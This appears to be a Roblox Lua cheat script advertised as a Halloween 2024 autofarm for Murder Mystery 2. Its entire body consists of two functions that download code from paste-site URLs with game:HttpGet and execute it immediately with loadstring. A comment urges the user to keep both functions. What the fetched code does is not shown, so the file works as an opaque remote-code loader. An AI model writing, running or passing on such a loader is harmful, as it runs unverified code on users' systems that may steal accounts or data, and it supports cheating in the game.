--[[
    FIXED!
    ███╗   ███╗███╗   ███╗██████╗ 
    ████╗ ████║████╗ ████║╚════██╗
    ██╔████╔██║██╔████╔██║ █████╔╝
    ██║╚██╔╝██║██║╚██╔╝██║██╔═══╝ 
    ██║ ╚═╝ ██║██║ ╚═╝ ██║███████╗
    ╚═╝     ╚═╝╚═╝     ╚═╝╚══════╝
    ███████╗██╗   ██╗███████╗███╗   ██╗████████╗
    ██╔════╝██║   ██║██╔════╝████╗  ██║╚══██╔══╝
    █████╗  ██║   ██║█████╗  ██╔██╗ ██║   ██║   
    ██╔══╝  ╚██╗ ██╔╝██╔══╝  ██║╚██╗██║   ██║   
    ███████╗ ╚████╔╝ ███████╗██║ ╚████║   ██║   
    ╚══════╝  ╚═══╝  ╚══════╝╚═╝  ╚═══╝   ╚═╝   
    
    🎃 AUT0FARM HALLOWEEN EVENT 2024 🎃
    ]]

-- DO NOT DELETE EACH FUNCTION TO AVOID ERRORS
local function autofarm()
  loadstring(game:HttpGet("https://paste.debian.net/plainh/4600c3d2/", true))()
end

local function library()
  loadstring(game:HttpGet("https://pastefy.app/zlt1hnGR/raw"))()
end

task.spawn(autofarm)
task.spawn(library)
